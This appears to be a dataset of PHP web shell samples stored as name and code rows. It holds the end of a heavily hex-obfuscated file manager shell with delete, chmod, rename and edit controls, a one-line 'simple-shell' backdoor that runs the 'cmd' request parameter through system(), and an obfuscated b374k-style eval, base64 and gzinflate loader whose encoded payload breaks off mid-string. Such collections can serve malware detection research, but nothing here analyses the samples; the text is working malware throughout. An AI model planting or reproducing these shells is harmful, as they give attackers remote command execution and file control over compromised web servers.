hre\x66\x3d\x22?\x70\x61th\x3d"".${${""GLOB\x41L\x53""}[""\x6c\x6d\x62\x79\x76\x79\x66""]}.""/"".${$pjvwmigkpj}.""\"">"".${${""GL\x4f\x42\x41\x4cS""}[""k\x61u\x65\x65\x64h\x65\x68\x6c\x6d""]}.""</a\x3e\x3c/td>\n<\x74d>\x3cc\x65\x6eter>--</\x63\x65\x6eter\x3e\x3c/\x74d\x3e\n\x3ctd\x3e<\x63\x65nt\x65\x72\x3e"";${""\x47\x4cOB\x41\x4cS""}[""trhr\x61\x78t\x62\x72\x64\x6a""]=""p\x61t\x68"";if(is_writable(${${""\x47\x4c\x4f\x42A\x4c\x53""}[""\x6cmb\x79vy\x66""]}.""/"".${$hgcokjj}))echo""\x3c\x66ont \x63o\x6co\x72=\""gr\x65\x65n\x22>"";elseif(!is_readable(${${""\x47\x4cOBA\x4c\x53""}[""\x62\x72\x71\x68s\x73\x6e\x72\x64s""]}.""/"".${${""\x47L\x4f\x42\x41\x4c\x53""}[""\x77\x6cex\x70l\x74\x75u\x6c\x73""]}))echo""\x3c\x66\x6fn\x74\x20\x63\x6f\x6co\x72\x3d\x22b\x6c\x75e\""\x3e"";${""\x47\x4c\x4f\x42\x41\x4c\x53""}[""\x66qfz\x68\x74\x66\x6b""]=""dir"";echo perms(${${""G\x4cOB\x41\x4c\x53""}[""e\x68\x6d\x62\x75x\x78""]}.""/"".${${""\x47LOB\x41L\x53""}[""\x77lexp\x6ct\x75u\x6c\x73""]});if(is_writable(${$pokwgrfwecy}.""/"".${$fkrkggxfbg})||!is_readable(${${""\x47L\x4fB\x41\x4c\x53""}[""\x6c\x6d\x62\x79\x76\x79\x66""]}.""/"".${${""G\x4cO\x42\x41\x4c\x53""}[""\x66\x71f\x7aht\x66k""]}))echo""</\x66ont\x3e"";echo""</\x63en\x74er\x3e</\x74\x64>\n\x3c\x74\x64><cen\x74\x65\x72\x3e<\x66\x6frm \x6de\x74ho\x64\x3d\""\x50OS\x54\x22 a\x63tio\x6e=\x22?\x6fptio\x6e\x26\x70at\x68\x3d"".${${""\x47L\x4f\x42ALS""}[""\x74\x72\x68\x72\x61x\x74brd\x6a""]}.""\""\x3e\n<s\x65\x6cec\x74\x20\x6eam\x65=\x22\x6fp\x74\x22\x3e\n<op\x74i\x6fn\x20\x76\x61\x6cu\x65\x3d\""\x22\x3eSe\x6c\x65\x63\x74\x3c/o\x70\x74\x69o\x6e\x3e\n\x3c\x6f\x70\x74io\x6e \x76\x61l\x75\x65=\""\x64el\x65\x74e\"">Dele\x74e</o\x70t\x69on\x3e\n\x3copt\x69on val\x75\x65\x3d\""\x63\x68m\x6f\x64\""\x3eC\x68\x6d\x6fd\x3c/o\x70\x74\x69on>\n<\x6f\x70\x74\x69o\x6e v\x61\x6cue=\x22\x72\x65n\x61m\x65\""\x3eR\x65nam\x65</\x6fp\x74i\x6fn>\n\x3c/\x73\x65le\x63t\x3e\n\x3c\x69\x6e\x70\x75\x74\x20t\x79pe=\""hidde\x6e\"" n\x61\x6d\x65\x3d\x22\x74ype\x22 \x76alue=\x22di\x72\x22\x3e\n<in\x70u\x74\x20\x74\x79p\x65\x3d\""hi\x64\x64\x65\x6e\x22 \x6eam\x65\x3d\""name\""\x20\x76\x61\x6cue=\"""".${$ryfwiqqiv}.""\x22>\n\x3c\x69\x6e\x70\x75t\x20\x74\x79\x70e=\x22hid\x64e\x6e\""\x20n\x61m\x65\x3d\""\x70\x61t\x68\"" \x76a\x6cu\x65\x3d\x22"".${${""\x47\x4cO\x42\x41\x4c\x53""}[""\x6c\x6d\x62\x79vyf""]}.""/"".${${""GL\x4fBA\x4cS""}[""w\x6c\x65x\x70\x6ct\x75u\x6cs""]}.""\x22>\n\x3c\x69\x6e\x70ut\x20\x74y\x70\x65=\""subm\x69\x74\"" v\x61lue=\"">\""\x3e\n\x3c/\x66o\x72m\x3e</c\x65n\x74\x65r>\x3c/td>\n</\x74\x72>"";}echo""<\x74r \x63\x6c\x61\x73s\x3d\""first\x22\x3e<td\x3e\x3c/\x74\x64\x3e\x3ct\x64>\x3c/td\x3e\x3ctd\x3e\x3c/td\x3e\x3c\x74\x64>\x3c/\x74d\x3e</\x74\x72>"";foreach(${${""\x47LOB\x41\x4c\x53""}[""\x78\x75\x63\x6b\x68x\x73o""]} as${${""\x47L\x4f\x42A\x4c\x53""}[""j\x79\x65\x6b\x66\x79\x6d\x66\x65s\x76s""]}){$wcrxwlnlald=""\x66\x69l\x65"";$yqnmofoawro=""\x70\x61th"";${""\x47\x4c\x4fBA\x4c\x53""}[""\x64\x69u\x6f\x75\x64\x67v""]=""\x66i\x6c\x65"";$naoirxixpk=""f\x69\x6ce"";if(!is_file(${${""\x47\x4c\x4fB\x41\x4c\x53""}[""l\x6d\x62yvy\x66""]}.""/"".${${""\x47L\x4f\x42\x41\x4c\x53""}[""\x64\x74\x69\x67qx\x6d\x6dn\x78""]}))continue;$xloyqmlgqre=""\x66\x69l\x65"";$enydcqcwpdq=""\x70\x61\x74\x68"";${${""G\x4c\x4f\x42AL\x53""}[""\x68\x72\x65\x78de\x64yx\x78""]}=filesize(${${""\x47\x4c\x4f\x42A\x4c\x53""}[""l\x6d\x62\x79v\x79f""]}.""/"".${$naoirxixpk})/1024;${""\x47LOBALS""}[""\x79\x78\x79\x78\x72\x6f\x76\x69\x61""]=""\x70\x61\x74\x68"";$pklopydo=""f\x69\x6c\x65"";${${""\x47\x4cO\x42\x41L\x53""}[""hre\x78\x64\x65d\x79\x78x""]}=round(${${""G\x4c\x4f\x42\x41\x4cS""}[""\x68\x72\x65x\x64edy\x78\x78""]},3);${""\x47\x4c\x4f\x42\x41\x4cS""}[""r\x7ab\x6c\x6b\x70\x7ard""]=""\x70\x61\x74h"";${""\x47\x4cO\x42\x41\x4c\x53""}[""\x67\x6f\x64n\x73f\x74\x71\x6c""]=""p\x61\x74\x68"";if(${${""GL\x4f\x42\x41\x4c\x53""}[""\x68r\x65\x78\x64edy\x78\x78""]}>=1024){$zsxuchwnv=""s\x69ze"";${${""\x47\x4cOBA\x4cS""}[""\x68\x72e\x78\x64edyxx""]}=round(${$zsxuchwnv}/1024,2)."" MB"";}else{${""\x47LO\x42\x41L\x53""}[""\x71\x65bq\x78\x76rd\x6d\x68""]=""\x73\x69\x7ae"";${${""\x47\x4cO\x42\x41L\x53""}[""h\x72e\x78\x64\x65d\x79\x78\x78""]}=${${""\x47LOBA\x4c\x53""}[""\x71\x65b\x71\x78\x76rd\x6dh""]}."" K\x42"";}${""GLOB\x41\x4c\x53""}[""\x63\x64v\x72\x72ivx\x68r\x77\x6e""]=""\x73\x69\x7a\x65"";echo""<tr>\n<\x74\x64\x3e\x3ca \x68r\x65f=\x22?\x66il\x65\x73\x72\x63="".${${""\x47\x4cO\x42\x41\x4cS""}[""\x6c\x6d\x62\x79v\x79\x66""]}.""/"".${${""\x47\x4c\x4f\x42AL\x53""}[""d\x74\x69g\x71x\x6d\x6d\x6e\x78""]}.""&\x70\x61\x74\x68="".${$yqnmofoawro}.""\x22\x3e"".${$wcrxwlnlald}.""\x3c/a\x3e</td>\n<t\x64>\x3c\x63ente\x72>"".${${""G\x4cOB\x41L\x53""}[""\x63dvr\x72\x69\x76\x78\x68\x72\x77n""]}.""</c\x65n\x74\x65\x72></\x74d>\n<\x74d><\x63\x65\x6e\x74\x65r>"";if(is_writable(${$enydcqcwpdq}.""/"".${${""\x47\x4c\x4f\x42ALS""}[""\x64iu\x6fu\x64\x67\x76""]}))echo""<\x66\x6fnt\x20c\x6flor=\""\x67\x72e\x65n\x22>"";elseif(!is_readable(${${""G\x4c\x4fB\x41\x4c\x53""}[""\x67od\x6es\x66\x74ql""]}.""/"".${$pklopydo}))echo""<\x66on\x74 c\x6f\x6cor=\""bl\x75\x65\x22>"";$bxxegbwhccqp=""\x70a\x74\x68"";${""\x47\x4cO\x42\x41\x4c\x53""}[""\x71\x72\x67\x78d\x64\x62dw\x62u\x68""]=""fil\x65"";${""\x47\x4c\x4fBALS""}[""\x70\x74\x6cldp""]=""\x66i\x6c\x65"";echo perms(${${""G\x4cO\x42A\x4c\x53""}[""\x72zbl\x6bp\x7a\x72\x64""]}.""/"".${$xloyqmlgqre});if(is_writable(${$bxxegbwhccqp}.""/"".${${""\x47\x4c\x4fBAL\x53""}[""\x64\x74\x69g\x71x\x6d\x6d\x6e\x78""]})||!is_readable(${${""G\x4cO\x42\x41L\x53""}[""\x6c\x6db\x79\x76y\x66""]}.""/"".${${""\x47L\x4fB\x41L\x53""}[""\x70t\x6cl\x64\x70""]}))echo""\x3c/\x66\x6fn\x74>"";echo""\x3c/\x63\x65n\x74e\x72>\x3c/t\x64\x3e\n<\x74\x64\x3e\x3cce\x6e\x74e\x72><f\x6fr\x6d \x6de\x74h\x6fd\x3d\x22\x50\x4fS\x54\""\x20ac\x74i\x6fn=\""?o\x70tion&pat\x68\x3d"".${${""\x47\x4c\x4fB\x41\x4cS""}[""\x79\x78\x79\x78\x72o\x76\x69a""]}.""\x22\x3e\n\x3csele\x63\x74\x20\x6e\x61\x6de=\x22\x6fp\x74\""\x3e\n\x3co\x70t\x69\x6f\x6e\x20\x76a\x6c\x75\x65=\x22\"">Se\x6c\x65c\x74\x3c/option\x3e\n<\x6fpti\x6f\x6e\x20\x76al\x75e=\""\x64\x65\x6ce\x74\x65\"">D\x65\x6c\x65te\x3c/op\x74\x69\x6fn\x3e\n\x3c\x6f\x70\x74i\x6fn\x20v\x61\x6cue=\x22\x63\x68\x6d\x6f\x64\""\x3eC\x68\x6d\x6f\x64</\x6f\x70\x74\x69\x6f\x6e>\n\x3co\x70\x74i\x6fn\x20val\x75\x65\x3d\x22\x72\x65n\x61me\x22\x3eR\x65n\x61me\x3c/\x6f\x70\x74i\x6fn\x3e\n\x3co\x70tio\x6e \x76\x61\x6c\x75e=\x22\x65di\x74\x22>E\x64\x69\x74</o\x70\x74\x69o\x6e>\n</se\x6c\x65c\x74>\n\x3c\x69\x6e\x70\x75t typ\x65\x3d\x22\x68\x69dde\x6e\"" n\x61\x6de\x3d\x22\x74\x79\x70\x65\x22 \x76\x61\x6c\x75e=\x22file\x22\x3e\n\x3c\x69npu\x74 \x74yp\x65=\""\x68\x69d\x64en\""\x20n\x61m\x65=\""\x6e\x61m\x65\x22\x20v\x61l\x75e=\x22"".${${""\x47\x4c\x4f\x42A\x4c\x53""}[""\x64t\x69\x67\x71\x78\x6dm\x6e\x78""]}.""\""\x3e\n<in\x70\x75t t\x79\x70\x65\x3d\x22hid\x64\x65\x6e\"" n\x61m\x65\x3d\x22\x70\x61\x74\x68\"" \x76al\x75\x65\x3d\"""".${${""\x47L\x4fB\x41L\x53""}[""\x6cm\x62\x79\x76\x79\x66""]}.""/"".${${""G\x4c\x4fB\x41\x4cS""}[""\x71\x72\x67\x78\x64d\x62d\x77bu\x68""]}.""\x22\x3e\n<i\x6ep\x75t \x74yp\x65\x3d\x22\x73\x75\x62\x6d\x69t\"" \x76alu\x65\x3d\x22>\x22\x3e\n\x3c/form\x3e\x3c/\x63e\x6et\x65r></\x74d>\n\x3c/\x74\x72\x3e"";}echo""\x3c/t\x61ble\x3e\n</d\x69v\x3e"";}echo""\x3c\x63\x65\x6et\x65r>\x3cb\x72/> OH\x41\x20Y\x4fO\x4fO \x3c/c\x65n\x74e\x72>\n\x3c/bod\x79\x3e\n\x3c/htm\x6c\x3e"";function perms($file){${""\x47\x4c\x4fB\x41\x4c\x53""}[""cp\x62c\x74\x66\x77\x6a\x77\x68""]=""f\x69l\x65"";$eureyhvefuui=""\x69\x6e\x66\x6f"";${""\x47\x4c\x4f\x42\x41\x4c\x53""}[""\x67\x6d\x75\x6eft\x73f\x64""]=""p\x65\x72\x6d\x73"";${${""\x47\x4cO\x42A\x4c\x53""}[""\x75\x66\x79\x70np\x77\x67\x64d\x71""]}=fileperms(${${""\x47\x4c\x4f\x42A\x4c\x53""}[""\x63\x70bctf\x77j\x77h""]});${""\x47\x4c\x4f\x42A\x4cS""}[""w\x6f\x6c\x6b\x68\x64er\x72""]=""p\x65r\x6ds"";${""\x47\x4cO\x42\x41\x4c\x53""}[""fvg\x74\x65\x67""]=""\x70\x65\x72\x6d\x73"";${""G\x4cO\x42A\x4cS""}[""\x67\x78\x79c\x6at\x68""]=""\x69n\x66\x6f"";${""\x47\x4cO\x42\x41\x4cS""}[""aij\x69u\x6fd""]=""inf\x6f"";${""\x47L\x4fBA\x4c\x53""}[""b\x66dveb\x68\x66\x68kg""]=""\x70\x65\x72\x6d\x73"";${""G\x4c\x4f\x42\x41\x4c\x53""}[""\x6cl\x6ci\x6c\x6b\x66k\x74o""]=""\x70\x65r\x6d\x73"";${""GL\x4f\x42\x41\x4c\x53""}[""\x71lr\x7aw\x62th\x71\x78\x75""]=""\x69n\x66o"";$cdrxuvtx=""p\x65\x72\x6ds"";${""\x47\x4c\x4f\x42\x41\x4cS""}[""\x69\x70k\x6f\x72xocl""]=""\x69\x6e\x66\x6f"";${""\x47\x4c\x4fBAL\x53""}[""md\x6eog\x78pz""]=""p\x65\x72m\x73"";$bcaosounsfz=""\x69\x6e\x66o"";$ljjlxm=""\x69\x6ef\x6f"";if((${${""\x47\x4cO\x42\x41L\x53""}[""\x75\x66y\x70\x6e\x70\x77g\x64d\x71""]}&0xC000)==0xC000){$wylqzptv=""i\x6e\x66o"";${$wylqzptv}=""\x73"";}elseif((${${""\x47\x4cOBAL\x53""}[""\x75\x66y\x70\x6e\x70\x77\x67d\x64q""]}&0xA000)==0xA000){${""\x47\x4c\x4f\x42AL\x53""}[""\x69\x6b\x74\x65\x78\x69y\x62\x68o""]=""\x69\x6e\x66\x6f"";${${""\x47L\x4f\x42\x41\x4c\x53""}[""\x69k\x74\x65xi\x79bh\x6f""]}=""l"";}elseif((${${""GLO\x42\x41\x4c\x53""}[""u\x66yp\x6e\x70wg\x64\x64\x71""]}&0x8000)==0x8000){${${""\x47\x4c\x4fB\x41\x4cS""}[""\x71\x7a\x71\x65\x67\x62\x71\x73""]}=""-"";}elseif((${${""\x47\x4cO\x42\x41\x4cS""}[""\x75f\x79p\x6e\x70\x77\x67\x64\x64\x71""]}&0x6000)==0x6000){${""\x47L\x4f\x42\x41LS""}[""o\x76\x72\x63o\x66\x6d\x6f\x76""]=""in\x66\x6f"";${${""\x47\x4cOBALS""}[""\x6f\x76r\x63\x6ff\x6d\x6fv""]}=""b"";}elseif((${${""\x47\x4cO\x42\x41LS""}[""\x77olk\x68d\x65r\x72""]}&0x4000)==0x4000){${${""\x47L\x4f\x42\x41\x4cS""}[""\x71\x7a\x71\x65g\x62\x71s""]}=""\x64"";}elseif((${${""G\x4c\x4f\x42\x41\x4c\x53""}[""\x66vg\x74\x65\x67""]}&0x2000)==0x2000){${""\x47\x4cOB\x41\x4c\x53""}[""\x67\x79\x6d\x77q\x73\x6f\x71\x69""]=""i\x6e\x66\x6f"";${${""\x47\x4cO\x42\x41\x4c\x53""}[""\x67y\x6dw\x71\x73o\x71i""]}=""c"";}elseif((${$cdrxuvtx}&0x1000)==0x1000){${""G\x4cO\x42\x41\x4c\x53""}[""\x76d\x77\x74\x71\x72\x70\x79\x71""]=""i\x6e\x66o"";${${""\x47\x4cO\x42\x41LS""}[""v\x64\x77\x74q\x72p\x79\x71""]}=""\x70"";}else{${""\x47\x4cOB\x41L\x53""}[""\x72\x63\x64\x71e\x6c\x71ce\x70\x72u""]=""i\x6e\x66o"";${${""G\x4c\x4f\x42\x41L\x53""}[""rc\x64\x71e\x6cq\x63\x65\x70\x72\x75""]}=""u"";}$xieyhfxkw=""p\x65\x72\x6ds"";${${""\x47\x4cO\x42\x41\x4c\x53""}[""\x71\x7a\x71\x65\x67b\x71\x73""]}.=((${${""\x47L\x4f\x42\x41LS""}[""g\x6d\x75\x6e\x66\x74\x73\x66d""]}&0x0100)?""r"":""-"");${""G\x4cOB\x41\x4c\x53""}[""\x63\x6a\x6fg\x70di""]=""perms"";${""\x47\x4c\x4fB\x41\x4cS""}[""\x77o\x6fnp\x79\x78n\x6bgm""]=""\x69\x6ef\x6f"";${$eureyhvefuui}.=((${${""GL\x4f\x42\x41LS""}[""\x75\x66\x79pn\x70\x77\x67\x64dq""]}&0x0080)?""\x77"":""-"");${${""\x47L\x4fB\x41\x4c\x53""}[""\x71lr\x7aw\x62\x74\x68q\x78\x75""]}.=((${${""\x47LOBALS""}[""\x75\x66y\x70\x6e\x70wg\x64d\x71""]}&0x0040)?((${${""\x47\x4cO\x42\x41LS""}[""\x75\x66y\x70\x6e\x70\x77\x67\x64\x64\x71""]}&0x0800)?""s"":""\x78""):((${${""\x47\x4c\x4f\x42A\x4c\x53""}[""uf\x79p\x6e\x70w\x67\x64d\x71""]}&0x0800)?""\x53"":""-""));${""\x47\x4cOB\x41L\x53""}[""o\x6e\x6bt\x6b\x6e\x63\x66\x76\x69p""]=""p\x65r\x6ds"";${${""\x47L\x4f\x42A\x4cS""}[""\x61\x69j\x69\x75o\x64""]}.=((${${""\x47\x4cOBA\x4c\x53""}[""\x6f\x6e\x6b\x74\x6b\x6e\x63\x66\x76\x69\x70""]}&0x0020)?""\x72"":""-"");${${""\x47\x4c\x4f\x42\x41\x4c\x53""}[""\x67\x78\x79c\x6a\x74h""]}.=((${${""\x47L\x4f\x42\x41L\x53""}[""\x75\x66y\x70\x6e\x70\x77\x67d\x64\x71""]}&0x0010)?""w"":""-"");${${""G\x4c\x4f\x42A\x4c\x53""}[""\x69\x70k\x6fr\x78\x6f\x63\x6c""]}.=((${$xieyhfxkw}&0x0008)?((${${""\x47\x4c\x4f\x42\x41\x4cS""}[""\x62\x66\x64\x76\x65bhf\x68\x6bg""]}&0x0400)?""\x73"":""\x78""):((${${""\x47L\x4fB\x41LS""}[""\x75\x66y\x70\x6e\x70wg\x64\x64\x71""]}&0x0400)?""S"":""-""));${${""\x47\x4cO\x42A\x4c\x53""}[""\x71\x7a\x71e\x67\x62q\x73""]}.=((${${""\x47\x4c\x4f\x42\x41\x4c\x53""}[""m\x64\x6e\x6f\x67x\x70z""]}&0x0004)?""r"":""-"");${${""\x47LOB\x41LS""}[""\x77oon\x70\x79\x78\x6e\x6b\x67m""]}.=((${${""\x47\x4c\x4f\x42\x41\x4c\x53""}[""c\x6a\x6f\x67\x70\x64\x69""]}&0x0002)?""w"":""-"");${$bcaosounsfz}.=((${${""\x47L\x4f\x42\x41\x4c\x53""}[""u\x66\x79p\x6e\x70\x77g\x64dq""]}&0x0001)?((${${""G\x4cOB\x41\x4c\x53""}[""\x75\x66\x79\x70\x6ep\x77\x67\x64d\x71""]}&0x0200)?""\x74"":""x""):((${${""\x47L\x4f\x42\x41\x4c\x53""}[""\x6cl\x6ci\x6ck\x66\x6b\x74o""]}&0x0200)?""\x54"":""-""));return${$ljjlxm};}
?>"
simple-shell,"<?php if(isset($_REQUEST['cmd'])){ echo ""<pre>""; $cmd = ($_REQUEST['cmd']); system($cmd); echo ""</pre>""; die; }?>"
sad-razam,"<?php

$b3 = ""ZXZhbCglMjIlM0YlM0UlMjIuZ3p1bmNvbXByZXNzKGd6dW5jb21wcmVzcyhnemluZmxhdGUoZ3ppbmZsYXRlKGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKHN0cnJldiglMjRiMzc0aykpKSkpKSkpJTNC"";
$b374k = ""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